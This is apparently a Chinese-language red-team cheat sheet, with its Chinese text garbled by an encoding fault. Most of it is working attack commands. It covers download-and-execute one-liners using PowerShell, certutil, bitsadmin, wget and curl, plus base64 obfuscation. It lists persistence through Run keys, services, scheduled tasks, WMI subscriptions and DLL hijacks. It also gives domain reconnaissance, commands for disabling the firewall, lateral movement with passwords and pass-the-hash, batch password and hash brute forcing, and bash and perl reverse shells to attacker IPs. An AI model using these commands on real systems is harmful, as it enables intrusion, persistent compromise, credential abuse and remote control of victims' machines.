<p>å¸¸è§çŸ­æ–‡ä»¶å</p>
<pre><code>Documents and Settings
å¯è¡¨ç¤ºä¸º
DOCUME~1
åˆå¦‚ï¼š
Local Settings
å¯è¡¨ç¤ºä¸º
LOCALS~1

Program Files
Program Files (x86)
è¿™ä¸¤ä¸ªç›®å½•åˆ†åˆ«è¡¨ç¤ºä¸ºï¼š
PROGRA~1
PROGRA~2
</code></pre>
<h2 id="powershellæ–‡ä»¶ä¸‹è½½"><a href="#powershellæ–‡ä»¶ä¸‹è½½" class="headerlink" title="powershellæ–‡ä»¶ä¸‹è½½"></a>powershellæ–‡ä»¶ä¸‹è½½</h2><pre><code>powershell (new-object System.Net.WebClient).DownloadFile(&#39;http://192.168.1.1/1.exe&#39;,&#39;C:\test\1.exe&#39;);start-process &#39;C:\test\1.exe&#39;
</code></pre>
<p>å¸¸ç”¨</p>
<pre><code>powershell (new-object System.Net.WebClient).DownloadFile(&#39;http://192.168.1.1/1.exe&#39;,&#39;1.exe&#39;)
</code></pre>
<pre><code>Invoke-Expression (New-Object Net.WebClient).DownloadString(&quot;http://xxx.xx.xx.xx/test.ps1&quot;)
</code></pre>
<p>bypass</p>
<pre><code>echo (new-object System.Net.WebClient).DownloadFile(&#39;http://192.168.31.93:8000/tomcat.exe&#39;,&#39;C:/Users/test/cc.exe&#39;)| powershell -
</code></pre>
<p>base64ç¼–ç (å’Œå…¶ä»–base64ä¸åŒï¼Œè§£ä¸å¼€)</p>
<pre><code>$Text = &quot;(new-object System.Net.WebClient).DownloadFile(&#39;http://xxxxxxxxxx:8000/bddch.txt&#39;,&#39;bdchd.txt&#39;)&quot;
$Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)
$EncodedText =[Convert]::ToBase64String($Bytes)
$EncodedText
</code></pre>
<p>base64è§£ç </p>
<pre><code>$EncodedText = &quot;dwByAGkAxxxxxxxxxxxxxxxxxxxAG0AbgB0AG4AJwA=&quot;
$DecodedText = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($EncodedText))
$DecodedText
</code></pre>
<p>è¿è¡Œbase64ç¼–ç åçš„å‘½ä»¤</p>
<pre><code>powershell -noP -sta -enc xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
</code></pre>
<h2 id="certutil-exeä¸‹è½½"><a href="#certutil-exeä¸‹è½½" class="headerlink" title="certutil.exeä¸‹è½½"></a>certutil.exeä¸‹è½½</h2><pre><code>C:\Windows\System32\certutil.exe C:\Users\Public\cer.exe
</code></pre>
<pre><code>certutil.exe -urlcache -split -f http://192.168.1.1/1.exe
</code></pre>
<pre><code>certutil.exe -urlcache -split -f http://192.168.1.1/1.txt 1.exe
</code></pre>
<pre><code>certutil.exe -urlcache -split -f http://192.168.6.27:8012/download/f.ext C:\windows\temp\up.exe &amp;&amp;start C:\windows\temp\up.exe
</code></pre>
<p>åˆ é™¤ç¼“å­˜</p>
<pre><code>certutil.exe -urlcache -split -f http://192.168.1.1/1.exe delete
</code></pre>
<p>æŸ¥çœ‹ç¼“å­˜é¡¹ç›®ï¼š</p>
<pre><code>certutil.exe -urlcache *
</code></pre>
<p>è½¬ä¸ºbase64</p>
<pre><code>certutil -encode lcx64.exe lcx64.txt
</code></pre>
<p>è½¬å›æ¥</p>
<pre><code>certutil -decode lcx64.txt lcx64.exe
</code></pre>
<p>æŸ¥çœ‹md5</p>
<pre><code>certutil -hashfile a.exe MD5
</code></pre>
<p>bypass</p>
<pre><code>Certutil &amp; Certutil â€“urlcache â€“f â€“split url
Certutil | Certutil â€“urlcache â€“f â€“split url
</code></pre>
<h2 id="bitsadmin"><a href="#bitsadmin" class="headerlink" title="bitsadmin"></a>bitsadmin</h2><p><strong>ä¸æ”¯æŒhttpsã€ftpåè®®ï¼Œphp pythonå¸¦çš„æœåŠ¡å™¨ä¼šå‡ºé”™</strong></p>
<pre><code>bitsadmin /transfer n http://192.168.1.1/1.exe  C:\test\update\1.exe
</code></pre>
<h2 id="wget-ä¸‹è½½æ–‡ä»¶"><a href="#wget-ä¸‹è½½æ–‡ä»¶" class="headerlink" title="wget ä¸‹è½½æ–‡ä»¶"></a>wget ä¸‹è½½æ–‡ä»¶</h2><p>ä¸‹è½½åˆ°æŒ‡å®šç›®å½•</p>
<pre><code>wget -P /tmp http://127.0.0.1:8088/aliyun
</code></pre>
<h2 id="curl-ä¸‹è½½"><a href="#curl-ä¸‹è½½" class="headerlink" title="curl ä¸‹è½½"></a>curl ä¸‹è½½</h2><p>ä½¿ç”¨å†…ç½®optionï¼š-o(å°å†™)</p>
<pre><code>curl -o dodo1.jpg http:www.linux.com/dodo1.JPG
</code></pre>
<p>ä½¿ç”¨å†…ç½®optionï¼š-Oï¼ˆå¤§å†™)</p>
<pre><code>curl -O http://www.linux.com/dodo1.JPG
</code></pre>
<p>ä¸‹è½½åï¼Œä¸Šçº¿</p>
<pre><code>chmod +x /tmp/aliyun&amp;&amp;/tmp/aliyun
</code></pre>
<h2 id="windowsæƒé™ç»´æŒ"><a href="#windowsæƒé™ç»´æŒ" class="headerlink" title="windowsæƒé™ç»´æŒ"></a>windowsæƒé™ç»´æŒ</h2><h3 id="Startupç›®å½•"><a href="#Startupç›®å½•" class="headerlink" title="Startupç›®å½•"></a>Startupç›®å½•</h3><pre><code>NT6ä»¥åçš„ç›®å½•å¦‚ä¸‹ï¼š

å¯¹å½“å‰ç”¨æˆ·æœ‰æ•ˆï¼š
C:\Users\Username\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
å¯¹æ‰€æœ‰ç”¨æˆ·æœ‰æ•ˆï¼š
C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp
NT6ä»¥å‰çš„ç›®å½•å¦‚ä¸‹ï¼š

å¯¹å½“å‰ç”¨æˆ·æœ‰æ•ˆï¼š
C:\Documents and Settings\Hunter\ã€Œå¼€å§‹ã€èœå•\ç¨‹åº\å¯åŠ¨
å¯¹æ‰€æœ‰ç”¨æˆ·æœ‰æ•ˆï¼š
C:\Documents and Settings\All Users\ã€Œå¼€å§‹ã€èœå•\ç¨‹åº\å¯åŠ¨
</code></pre>
<h3 id="æ³¨å†Œé”®"><a href="#æ³¨å†Œé”®" class="headerlink" title="æ³¨å†Œé”®"></a>æ³¨å†Œé”®</h3><pre><code>reg add &quot;XXXX&quot; /v evil /t REG_SZ /d &quot;[Absolute Path]\evil.exe&quot;
</code></pre>
<pre><code>1.Loadæ³¨å†Œé”®
HKEY_CURRENT_USERï¼¼Softwareï¼¼Microsoftï¼¼Windows NTï¼¼CurrentVersionï¼¼Windowsï¼¼load

2.Userinitæ³¨å†Œé”®
HKEY_LOCAL_MACHINEï¼¼Softwareï¼¼Microsoftï¼¼Windows NTï¼¼CurrentVersionï¼¼Winlogonï¼¼Userinit
é€šå¸¸è¯¥æ³¨å†Œé”®ä¸‹é¢æœ‰ä¸€ä¸ªuserinit.exeã€‚è¯¥é”®å…è®¸æŒ‡å®šç”¨é€—å·åˆ†éš”çš„å¤šä¸ªç¨‹åºï¼Œå¦‚userinit.exe,evil.exeã€‚

3.Explorerï¼¼Runæ³¨å†Œé”®
Explorerï¼¼Runé”®åœ¨HKEY_CURRENT_USERå’ŒHKEY_LOCAL_MACHINEä¸‹éƒ½æœ‰ã€‚
HKEY_CURRENT_USERï¼¼Softwareï¼¼Microsoftï¼¼Windowsï¼¼CurrentVersionï¼¼Policiesï¼¼Explorerï¼¼Run
HKEY_LOCAL_MACHINEï¼¼Softwareï¼¼Microsoftï¼¼Windowsï¼¼CurrentVersionï¼¼Policiesï¼¼Explorerï¼¼Run
Explorerï¼¼Runé”®åœ¨HKEY_CURRENT_USERå’ŒHKEY_LOCAL_MACHINEä¸‹éƒ½æœ‰ã€‚

4.RunServicesOnceæ³¨å†Œé”®
RunServicesOnceæ³¨å†Œé”®ç”¨æ¥å¯åŠ¨æœåŠ¡ç¨‹åºï¼Œå¯åŠ¨æ—¶é—´åœ¨ç”¨æˆ·ç™»å½•ä¹‹å‰ï¼Œè€Œä¸”å…ˆäºå…¶ä»–é€šè¿‡æ³¨å†Œé”®å¯åŠ¨çš„ç¨‹åºï¼Œåœ¨HKEY_CURRENT_USERå’ŒHKEY_LOCAL_MACHINEä¸‹éƒ½æœ‰ã€‚
HKEY_CURRENT_USERï¼¼Softwareï¼¼Microsoftï¼¼Windowsï¼¼CurrentVersionï¼¼RunServicesOnce
HKEY_LOCAL_MACHINEï¼¼Softwareï¼¼Microsoftï¼¼ Windowsï¼¼CurrentVersionï¼¼RunServicesOnce

5.RunServicesæ³¨å†Œé”®
RunServicesæ³¨å†Œé”®æŒ‡å®šçš„ç¨‹åºç´§æ¥RunServicesOnceæŒ‡å®šçš„ç¨‹åºä¹‹åè¿è¡Œï¼Œä½†ä¸¤è€…éƒ½åœ¨ç”¨æˆ·ç™»å½•ä¹‹å‰ã€‚
HKEY_CURRENT_USERï¼¼Softwareï¼¼Microsoftï¼¼Windowsï¼¼CurrentVersionï¼¼ RunServices
HKEY_LOCAL_MACHINEï¼¼Softwareï¼¼Microsoftï¼¼Windowsï¼¼ CurrentVersionï¼¼RunServices

6.RunOnceï¼¼Setupæ³¨å†Œé”®
HKEY_CURRENT_USERï¼¼Softwareï¼¼Microsoftï¼¼Windowsï¼¼CurrentVersionï¼¼RunOnceï¼¼Setup
HKEY_LOCAL_MACHINEï¼¼Softwareï¼¼Microsoftï¼¼Windowsï¼¼CurrentVersionï¼¼RunOnceï¼¼Setup

7.RunOnceæ³¨å†Œé”®
å®‰è£…ç¨‹åºé€šå¸¸ç”¨RunOnceé”®è‡ªåŠ¨è¿è¡Œç¨‹åºï¼Œå®ƒçš„ä½ç½®åœ¨
HKEY_LOCAL_MACHINEï¼¼Softwareï¼¼Microsoftï¼¼Windowsï¼¼CurrentVersionï¼¼RunOnce
[å°äºNT6]HKEY_LOCAL_MACHINEï¼¼Softwareï¼¼Microsoftï¼¼Windowsï¼¼CurrentVersionï¼¼RunOnceEx
HKEY_CURRENT_USERï¼¼Softwareï¼¼Microsoftï¼¼Windowsï¼¼CurrentVersionï¼¼RunOnce
HKEY_LOCAL_MACHINEä¸‹é¢çš„RunOnceé”®ä¼šåœ¨ç”¨æˆ·ç™»å½•ä¹‹åç«‹å³è¿è¡Œç¨‹åºï¼Œè¿è¡Œæ—¶æœºåœ¨å…¶ä»–Runé”®æŒ‡å®šçš„ç¨‹åºä¹‹å‰ï¼›HKEY_CURRENT_USERä¸‹é¢çš„RunOnceé”®åœ¨æ“ä½œç³»ç»Ÿå¤„ç†å…¶ä»–Runé”®ä»¥åŠâ€œå¯åŠ¨â€æ–‡ä»¶å¤¹çš„å†…å®¹ä¹‹åè¿è¡Œã€‚

8.Runæ³¨å†Œé”®
HKEY_CURRENT_USERï¼¼Softwareï¼¼Microsoftï¼¼Windowsï¼¼CurrentVersionï¼¼Run
HKEY_LOCAL_MACHINEï¼¼Softwareï¼¼Microsoftï¼¼Windowsï¼¼CurrentVersionï¼¼Run
Runæ˜¯è‡ªåŠ¨è¿è¡Œç¨‹åºæœ€å¸¸ç”¨çš„æ³¨å†Œé”®ï¼ŒHKEY_CURRENT_USERä¸‹é¢çš„Runé”®ç´§æ¥HKEY_LOCAL_MACHINEä¸‹é¢çš„Runé”®è¿è¡Œï¼Œä½†ä¸¤è€…éƒ½åœ¨å¤„ç†â€œå¯åŠ¨â€æ–‡ä»¶å¤¹ä¹‹å‰ã€‚
</code></pre>
<h3 id="æœåŠ¡"><a href="#æœåŠ¡" class="headerlink" title="æœåŠ¡"></a>æœåŠ¡</h3><pre><code>sc create evil binpath= &quot;cmd.exe /k [Absolute Path]evil.exe&quot; start= &quot;auto&quot; obj= &quot;LocalSystem&quot;
</code></pre>
<h3 id="è®¡åˆ’ä»»åŠ¡"><a href="#è®¡åˆ’ä»»åŠ¡" class="headerlink" title="è®¡åˆ’ä»»åŠ¡"></a>è®¡åˆ’ä»»åŠ¡</h3><pre><code>SCHTASKS /Create /RU SYSTEM /SC ONSTART /RL HIGHEST /TN \Microsoft\Windows\evil\eviltask /TR C:\Users\hunter\Desktop\evil.exe
</code></pre>
<h3 id="WMIäº‹ä»¶"><a href="#WMIäº‹ä»¶" class="headerlink" title="WMIäº‹ä»¶"></a>WMIäº‹ä»¶</h3><pre><code>wmic /NAMESPACE:&quot;\\root\subscription&quot; PATH __EventFilter CREATE Name=&quot;evil&quot;, EventNameSpace=&quot;root\cimv2&quot;,QueryLanguage=&quot;WQL&quot;, Query=&quot;SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA &#39;Win32_PerfFormattedData_PerfOS_System&#39; AND TargetInstance.SystemUpTime &gt;= 240 AND TargetInstance.SystemUpTime &lt; 310&quot;

wmic /NAMESPACE:&quot;\\root\subscription&quot; PATH CommandLineEventConsumer CREATE Name=&quot;evilConsumer&quot;, ExecutablePath=&quot;C:\Users\hunter\Desktop\beacon.exe&quot;,CommandLineTemplate=&quot;C:\Users\hunter\Desktop\beacon.exe&quot;

wmic /NAMESPACE:&quot;\\root\subscription&quot; PATH __FilterToConsumerBinding CREATE Filter=&quot;__EventFilter.Name=\&quot;evil\&quot;&quot;, Consumer=&quot;CommandLineEventConsumer.Name=\&quot;evilConsumer\&quot;&quot;
</code></pre>
<h3 id="å±å¹•ä¿æŠ¤"><a href="#å±å¹•ä¿æŠ¤" class="headerlink" title="å±å¹•ä¿æŠ¤"></a>å±å¹•ä¿æŠ¤</h3><pre><code>reg add &quot;hkcu\control panel\desktop&quot; /v SCRNSAVE.EXE /d C:\Users\hunter\Desktop\beacon.exe /f
reg add &quot;hkcu\control panel\desktop&quot; /v ScreenSaveActive /d 1 /f
reg add &quot;hkcu\control panel\desktop&quot; /v ScreenSaverIsSecure /d 0 /f
reg add &quot;hkcu\control panel\desktop&quot; /v ScreenSaveTimeOut /d 60 /f
</code></pre>
<h3 id="bitsadmin-1"><a href="#bitsadmin-1" class="headerlink" title="bitsadmin"></a>bitsadmin</h3><pre><code>bitsadmin /create evil
bitsadmin /addfile evil &quot;C:\Users\hunter\Desktop\beacon.exe&quot; &quot;C:\Users\hunter\Desktop\beacon.exe&quot;
bitsadmin.exe /SetNotifyCmdLine evil &quot;C:\Users\hunter\Desktop\beacon.exe&quot; NUL
bitsadmin /Resume evil
</code></pre>
<h3 id="Netshç™½åŠ é»‘"><a href="#Netshç™½åŠ é»‘" class="headerlink" title="Netshç™½åŠ é»‘"></a>Netshç™½åŠ é»‘</h3><pre><code>å¯ä»¥é€šè¿‡å¯¼å…¥helperdllçš„æ–¹å¼åšæƒé™ç»´æŒï¼Œå‘½ä»¤æ ¼å¼å¦‚ä¸‹ï¼š
netsh add helper [Absolute evil DLL path]
ä½†æ˜¯ç”±äºnetshå¹¶ä¸ä¼šå¼€å¯è‡ªå¯åŠ¨ï¼Œå› æ­¤è¿˜è¦å†å†™ä¸€æ¡è‡ªå¯åŠ¨é¡¹ï¼š
reg add &quot;HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run&quot; /v Pentestlab /t REG_SZ /d &quot;cmd /c C:\Windows\System32\netsh&quot;
é‡æ–°å¯åŠ¨åä¾ç„¶å¯è·å¾—shellï¼š
</code></pre>
<h3 id="MSDTC"><a href="#MSDTC" class="headerlink" title="MSDTC"></a>MSDTC</h3><p>åœ¨é»˜è®¤çš„Windowså®‰è£…ä¸­ï¼ŒSystem32æ–‡ä»¶å¤¹ä¸­ç¼ºå°‘oci.dllè¿™ä¸ªæ–‡ä»¶ï¼Œåœ¨è·å¾—å†™æƒé™çš„æƒ…å†µä¸‹å¯ä»¥åœ¨è¯¥æ–‡ä»¶å¤¹ä¸‹å†™å…¥ä¸€ä¸ªåŒåçš„dllï¼ŒæœåŠ¡å¯åŠ¨æ—¶æ‰§è¡Œæ¶æ„ä»£ç ã€‚<br>é»˜è®¤æƒ…å†µä¸‹ï¼Œç”±äºå¯åŠ¨ç±»å‹è®¾ç½®ä¸ºâ€œæ‰‹åŠ¨â€ï¼Œé€šè¿‡ä»¥ä¸‹å‘½ä»¤è®¾ç½®è‡ªå¯ï¼š</p>
<pre><code>sc qc msdtc
sc config msdtc start= auto
</code></pre>
<h2 id="windowsä¿¡æ¯æ”¶é›†å¸¸ç”¨å‘½ä»¤"><a href="#windowsä¿¡æ¯æ”¶é›†å¸¸ç”¨å‘½ä»¤" class="headerlink" title="windowsä¿¡æ¯æ”¶é›†å¸¸ç”¨å‘½ä»¤"></a>windowsä¿¡æ¯æ”¶é›†å¸¸ç”¨å‘½ä»¤</h2><pre><code>Systeminfo è®¡ç®—æœºè¯¦ç»†ä¿¡æ¯(è¡¥ä¸ä¿¡æ¯)

Net start æ‰€å¯åŠ¨çš„æœåŠ¡

Wmic service list brief æŸ¥è¯¢æœ¬æœºæœåŠ¡ä¿¡æ¯

Tasklist è¿›ç¨‹åˆ—è¡¨

Wmic startup get command,caption æŸ¥çœ‹å¯åŠ¨è¯¥ç¨‹åºä¿¡æ¯

Schtasks /query /fo LIST /vè®¡åˆ’ä»»åŠ¡

Netstat -ano æ ¹æ®æœ¬æœºç«¯å£å¼€æ”¾æƒ…å†µæ¥åˆ¤æ–­æœ‰ä»€ä¹ˆæœåŠ¡ã€å…¶è§’è‰²

Query user || qwinsta æŸ¥çœ‹å½“å‰åœ¨çº¿ç”¨æˆ·

Net session åˆ—å‡ºä¼šè¯

Net share æŸ¥çœ‹æœ¬æœºçš„å…±äº«åˆ—è¡¨

Wmic share get name,path,status æŸ¥çœ‹å…±äº«åˆ—è¡¨

Net user æœ¬åœ°ç”¨æˆ·

Net user kkkk æŸ¥çœ‹æœ¬åœ°ç”¨æˆ·ä¿¡æ¯


Net localgroup æœ¬åœ°ç”¨æˆ·ç»„

Net localgroup /domain åŸŸç”¨æˆ·ç»„

Net localgroup adminnstrators æœ¬åœ°ç®¡ç†å‘˜ç»„æˆå‘˜

net localgroup adminstrators /domain æŸ¥çœ‹ç™»é™†è¿‡ä¸»æœºçš„ç®¡ç†å‘˜

Wmic useraccount get /all è·å–åŸŸå†…ç”¨æˆ·è¯¦ç»†ä¿¡æ¯

dsquery user æŸ¥çœ‹å­˜åœ¨çš„ç”¨æˆ·

Net user /domain åŸŸç”¨æˆ·ä¿¡æ¯

Net user kkkk /domain åŸŸç”¨æˆ·kkkkä¿¡æ¯

Net user kent password /add /domainæ·»åŠ åŸŸç”¨æˆ·


Net group /domain åŸŸç”¨æˆ·ç»„ä¿¡æ¯

Net view /domain æŸ¥è¯¢åŸŸ

Net view /domain:test æŸ¥è¯¢åŸŸå†…è®¡ç®—æœº

Net accounts /domain æŸ¥è¯¢åŸŸä¸­å¯†ç ç­–ç•¥

Net group /domain æŸ¥çœ‹åŸŸå†…æ‰€æœ‰ç”¨æˆ·ç»„

Net group &quot;Domain Controllers&quot; /domain æŸ¥çœ‹åŸŸæ§åˆ¶å™¨ç»„

Net group &quot;Domain computers&quot; /domain æŸ¥çœ‹åŸŸå†…æ‰€æœ‰è®¡ç®—æœºåˆ—è¡¨

Net group &quot;Domain admins&quot; /domain æŸ¥çœ‹åŸŸå†…ç®¡ç†å‘˜ç”¨æˆ·

Net user /domain kent active:yes å¯ç”¨åŸŸè´¦æˆ·

Net user /domain kent active:no ç¦ç”¨åŸŸè´¦æˆ·

Nltest /DCLIST:test æŸ¥çœ‹åŸŸä¸­åŸŸæ§åˆ¶å™¨å

Wmic useraccount get /all ç”¨æˆ·è¯¦ç»†ä¿¡æ¯

Net group &quot;Domain Admins&quot; /domain å¯¹åº”ç»„ä¸‹çš„è´¦æˆ·ä¿¡æ¯

nltest /domain_trusts è·å–åŸŸä¿¡ä»»ä¿¡æ¯

net config workstation äº†è§£æœ¬æœºçš„é…ç½®ä¿¡æ¯

Netsh firewall show config æŸ¥çœ‹é˜²ç«å¢™é…ç½®

Netsh advfirewall set allprofiles state offå…³é—­é˜²ç«å¢™(windows server 2003å)

Netsh advfirewall firewall add rule name=&quot;pass nc&quot; dir=in action=allow program=&quot;C:\nc.exe&quot; å…è®¸æŒ‡å®šç¨‹åºè¿›å…¥(windows server 2003å)

Netsh advfirewall firewall add rule name=&quot;allow nc&quot; dir=out action=allow program=&quot;C:\nc.exe&quot;å…è®¸æŒ‡å®šç¨‹åºé€€å‡º(windows server 2003å)

Netsh advfirewall firewall add rule name=&quot;Remote Desktop&quot; protocol=TCP dir=in localport=3389 action=allow å…è®¸3389è¿æ¥(windows server 2003å)

Reg query &quot;HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings&quot;æŸ¥çœ‹ç«¯å£ä»£ç†é…ç½®ä¿¡æ¯

Reg query &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&quot; /V PortNumber æŸ¥çœ‹è¿œç¨‹æ¡Œé¢ç«¯å£å·
</code></pre>
<h2 id="at-schtasks-scæ¨ªå‘"><a href="#at-schtasks-scæ¨ªå‘" class="headerlink" title="at&amp;schtasks&amp;scæ¨ªå‘"></a>at&amp;schtasks&amp;scæ¨ªå‘</h2><p>ä½¿ç”¨æ˜æ–‡å¯†ç ç™»å½•åˆ°ç›®æ ‡ï¼Œéœ€è¦445å’Œ139ç«¯å£å¼€å¯ï¼š</p>
<pre><code>net use \\192.168.2.148\ipc$ password /user:test\administrator

net use \\192.168.2.148\ipc$ password /user:administrator

å¤åˆ¶æ–‡ä»¶
copy c:\1.exe \\192.168.2.148\c$

atæ–°å»º10:10åˆ†è¿è¡Œçš„å®šæ—¶ä½œä¸š
at \\192.168.2.148 10:10 c:\1.exe

Windows server 2012åŠä»¥ä¸Šä½¿ç”¨schtaskså‘½ä»¤
Schtasks /create /s 192.168.2.148 /ru â€œSYSTEMâ€ /tn executefile /sc DAILY /tr c:/1.exe /F
Schtasks /run /s 192.168.2.148 /tn executefile /i
Schtasks /delete /s 192.168.2.148 /tn executefile /f

sc \\192.168.210.107 create hacker binpath=&quot;c:\shell1.exe&quot;   #åˆ›å»ºæœåŠ¡
sc \\192.168.210.107 start hacker      #å¯åŠ¨hackeræœåŠ¡
</code></pre>
<h2 id="impacketåŒ…æ¨ªå‘å‘½ä»¤"><a href="#impacketåŒ…æ¨ªå‘å‘½ä»¤" class="headerlink" title="impacketåŒ…æ¨ªå‘å‘½ä»¤"></a>impacketåŒ…æ¨ªå‘å‘½ä»¤</h2><p>ä¸‹è½½<a target="_blank" rel="noopener" href="https://github.com/maaaaz/impacket-examples-windows">https://github.com/maaaaz/impacket-examples-windows</a><br><a target="_blank" rel="noopener" href="https://github.com/ropnop/impacket_static_binaries/releases">https://github.com/ropnop/impacket_static_binaries/releases</a><br>Atexec</p>
<pre><code>éœ€è¦445ç«¯å£å¼€å¯
Atexec.exe hacker/administrator:abc123@192.168.202.148 &quot;whoami&quot;

Atexec.exe -hashes :fac5d668099409cb6fa223a32ea493b6 hacker/administrator@192.168.202.148 &quot;whoami&quot;
</code></pre>
<p>dcomexec</p>
<pre><code>éœ€è¦135ç«¯å£å¼€å¯
dcomexec.exe hacker/administrator:abc123@192.168.202.148 &quot;whoami&quot;

dcomexec.exe -hashes :fac5d668099409cb6fa223a32ea493b6 hacker/administrator@192.168.202.148 &quot;whoami&quot;
</code></pre>
<p>psexec</p>
<pre><code>å®˜æ–¹Psexecç¬¬ä¸€ç§åˆ©ç”¨æ–¹æ³•ï¼šå¯ä»¥å…ˆæœ‰ipcé“¾æ¥ï¼Œå†ç”¨psexecè¿è¡Œç›¸åº”çš„ç¨‹åºï¼š
Net use \192.168.202.148\ipc$ zxcvbnm123 /user:test\Administrator
Psexec \192.168.202.148 -accepteula -s cmd

å®˜æ–¹Psexecç¬¬äºŒç§åˆ©ç”¨æ–¹æ³•ï¼šä¸ç”¨å»ºç«‹ipcè¿æ¥ï¼Œç›´æ¥ä½¿ç”¨å¯†ç æˆ–hashè¿›è¡Œä¼ é€’
Psexec \192.168.202.148 -u Administrator -p zxcvbnm123 -s cmd

PsExec -hashes :fac5d668099409cb6fa223a32ea493b6 test.com/Administrator@192.168.202.148 &quot;whoami&quot; (å®˜æ–¹æä¾›çš„exeæ‰§è¡Œä¸äº†)
</code></pre>
<p>smbexec</p>
<pre><code>éœ€è¦445ç«¯å£å¼€å¯
Smbexec test/Administrator:zxcvbnm123@192.168.202.148
Smbexec -hashes :fac5d668099409cb6fa223a32ea493b6 test/Administrator@192.168.202.148
</code></pre>
<p>wmi</p>
<pre><code>WMIåˆ©ç”¨135ç«¯å£ï¼Œæ”¯æŒæ˜æ–‡å’Œhashä¸¤ç§æ–¹å¼è¿›è¡Œèº«ä»½éªŒè¯ï¼Œä¸”ç³»ç»Ÿæ—¥å¿—ä¸è®°å½•ã€‚
ç¬¬ä¸€ç§ï¼šä½¿ç”¨ç³»ç»Ÿè‡ªå¸¦çš„WMICæ˜æ–‡ä¼ é€’æ‰§è¡Œç›¸åº”å‘½ä»¤ï¼Œä½†æ‰§è¡Œçš„ç»“æœä¸å›æ˜¾ï¼ˆå…ˆç®¡ç†å‘˜è´¦æˆ·ç™»å½•ï¼‰
Wmic /node:192.168.202.148 /user:Administrator /password:zxcvbnm123 process call create &quot;cmd.exe /c ipconfig &gt;C:/1.txt&quot;

ç¬¬äºŒç§ï¼šä½¿ç”¨ç³»ç»Ÿè‡ªå¸¦cscriptæ˜æ–‡ä¼ é€’æ‰§è¡Œåå¼¹shellï¼Œæ‰§è¡Œç»“æœæœ‰å›æ˜¾ï¼Œç°å·²è¢«æ€
Cscript //nologo wmiexec.vbs /shell 192.168.202.148 Administrator zxcvbnm123

ç¬¬ä¸‰ç§ï¼šä½¿ç”¨ç¬¬ä¸‰æ–¹impacketå¥—ä»¶ä¸­çš„Wmiexecè¿›è¡Œæ˜æ–‡æˆ–hashä¼ é€’ï¼Œæ‰§è¡Œç»“æœæœ‰å›æ˜¾
Wmiexec test/Administrator:zxcvbnm123@192.168.202.148 &quot;whoami&quot;
Wmiexec -hashes :fac5d668099409cb6fa223a32ea493b6 test/Administrator@192.168.202.148 &quot;whoami&quot;
</code></pre>
<p>æ‰¹é‡æ“ä½œ,éœ€è¦ä¿å­˜ä¸ºbatæ‰§è¡Œ</p>
<pre><code>ç”¨å·²çŸ¥å¯†ç å’Œç”¨æˆ·ï¼Œæ‰¹é‡è¿æ¥ip:
FOR /F %%i in (ips.txt) do net use \%%i\ipc$ â€œpasswordâ€ /user:hacker\administrator

å·²çŸ¥ç”¨æˆ·å’Œipï¼Œæ‰¹é‡è¿æ¥å¯†ç (çˆ†ç ´å¯†ç )ï¼š
FOR /F %%i in (pass.txt) do net use \192.168.202.148\ipc$ &quot;%%i&quot; /user:test\administrator

å·²çŸ¥ç”¨æˆ·å’Œipï¼Œæ‰¹é‡è¿æ¥hash(çˆ†ç ´hash)ï¼š
FOR /F %%i in (hash.txt) do atexec.exe -hashes :&quot;%%i&quot; test/administrator@192.168.202.148 &quot;whoami&quot;
</code></pre>
<p>ç²¾å‡†æ‰¹é‡æ³•</p>
<pre><code>shell for /l %i in (1,1,253) do echo 172.22.13.%i &gt;&gt;tip.txt
shell for /f %i in (tip.txt) do ping -n 1 -w 10 %i | find /i &quot;ttl&quot; &gt;nul &amp;&amp; echo %%i &gt;&gt;ok.tx
shell for /f %i in (ok.txt) do dir \\%i\c$\users &gt;&gt;result.txt
</code></pre>
<p>cme æ‰¹é‡</p>
<pre><code>proxychains4 ./cme smb 10.0.0.1/24 -u administrator -H 31d6cfe0d16ae931b73c59d7e0c089c0 -d xx.org -x &quot;net user&quot;
</code></pre>
<p>å•ç‹¬æ‰§è¡Œå‘½ä»¤</p>
<pre><code>crackmapexec smb 192.168.10.11 -u Administrator -p &#39;P@ssw0rd&#39; -x whoami
</code></pre>
<p>ldapå–·æ´’</p>
<pre><code>cme ldap 10.11.12.211 -u &#39;username&#39; -p &#39;password&#39; --kdcHost 10.11.12.211 --users
</code></pre>
<h2 id="åå¼¹shell-æµé‡å¤ªæ•æ„Ÿï¼Œå°½é‡åŠ å¯†ç”¨"><a href="#åå¼¹shell-æµé‡å¤ªæ•æ„Ÿï¼Œå°½é‡åŠ å¯†ç”¨" class="headerlink" title="åå¼¹shell(æµé‡å¤ªæ•æ„Ÿï¼Œå°½é‡åŠ å¯†ç”¨)"></a>åå¼¹shell(æµé‡å¤ªæ•æ„Ÿï¼Œå°½é‡åŠ å¯†ç”¨)</h2><h2 id="nc"><a href="#nc" class="headerlink" title="nc"></a>nc</h2><pre><code>nc -lvvp 4444
</code></pre>
<h2 id="bash"><a href="#bash" class="headerlink" title="bash"></a>bash</h2><pre><code>bash -i &gt;&amp; /dev/tcp/172.16.1.130/4444 0&gt;&amp;1
exec 5&lt;&gt;/dev/tcp/172.16.1.130/4444;cat &lt;&amp;5|while read line;do $line &gt;&amp;5 2&gt;&amp;1;done
</code></pre>
<h2 id="perl"><a href="#perl" class="headerlink" title="perl"></a>perl</h2><pre><code>perl -e &#39;use Socket;$i=&quot;10.0.0.1&quot;;$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);&#125;;&#39;
</code></pre>
